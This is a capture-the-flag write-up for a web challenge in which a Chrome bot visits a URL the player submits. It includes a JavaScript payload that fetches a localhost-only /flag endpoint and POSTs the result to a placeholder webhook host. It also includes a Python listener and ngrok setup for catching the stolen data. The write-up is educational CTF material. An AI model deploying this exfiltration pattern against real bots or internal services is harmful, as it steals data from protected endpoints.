# Description
I heard you like flags, so I launched Chrome with a lot of flags again so you can get your flag!
This time the flag is localhost:1337/flag, and the bot will visit your URL!

# Solution
The challenge is similiar to the so-many-flags but now instead of providing the HTML directly, we need to provide a URL to a page, to which the server sends the request.
```javascript
app.post('/submit', (req, res) => {
  const { url } = req.body;

  if (!url) {
    return res.status(400).send('No URL provided');
  }

  let parsed = new URL(url);
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return res.status(400).send('Invalid URL');
  }
  ...
}
```

The server now also has `/flag` endpoint, which can be only accessed from the running instance. 
```javascript
app.get('/flag', (req, res) => {
  if (req.connection.remoteAddress === '::ffff:127.0.0.1' || req.connection.remoteAddress === "::1") return res.send(flag);
  res.send(`Nope! Your IP (${req.connection.remoteAddress}) is not localhost!`);
})

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
```

So the goal is pretty simple, create a website, which will make a request to `/flag` endpoint and return the result to us. For this I have used the same script from the previous challenge:
```javascript
<script>
    fetch("http://127.0.0.1:1337/flag")
        .then(response => response.text())
        .then(text => {
            fetch("YOUR_WEBHOOK_HERE", {
                method: "POST",
                body: text
            });
        });
</script>
```

Now the only thing is to create a server which the target can reach and get the exploit. I've explored 2 options
1. I found another [webhook website](https://webhook.site/), which can serve GET and POST responses, which can be configured <img width="299" alt="even_more_flags1" src="https://github.com/AdamZvara/CTF/assets/36104483/22c7bcc4-3b0d-4e29-a7b2-0329d3234fc7">
  - after configuration just change the address of `YOUR_WEBHOOK_HERE` to webhook address and get the flag
  - <img width="209" alt="image" src="https://github.com/AdamZvara/CTF/assets/36104483/87ae8b94-fad5-48bf-963e-9258a1ec99b4">
2. another thing I played around is [ngrok](https://dashboard.ngrok.com/), which is a bit more flexible and can run multiple protocols
  - the configuration was simple, first create python server
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        with open('exploit.html', 'r') as f:
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f.read().encode())

    def do_POST(self):
        flag = self.rfile.read(int(self.headers['Content-Length'])).decode('utf-8')
        print(flag)

def run():
    server_address = ('localhost', 8001)
    httpd = HTTPServer(server_address, MyServer)
    httpd.serve_forever()

run()
```
  - the server first receives the GET request and sends the exploit.html and second time it receives the POST request with the flag and prints it
  - run the server: `python3 pyserver.py` (listens to localhost:8001)
  - instal and setup ngrok
  - run ngrok: `ngrok http http://localhost:8001`
  - change the `YOUR_WEBHOOK_HERE` address to your ngrok address
  - after we provide the ngrok address to the challenge we get the flag
```
127.0.0.1 - - [02/Jun/2024 18:49:30] "GET / HTTP/1.1" 200 -
GPNCTF{WHY_D0_50M3_0F_TH353_FL4G5_3V3N_3X15T}
```

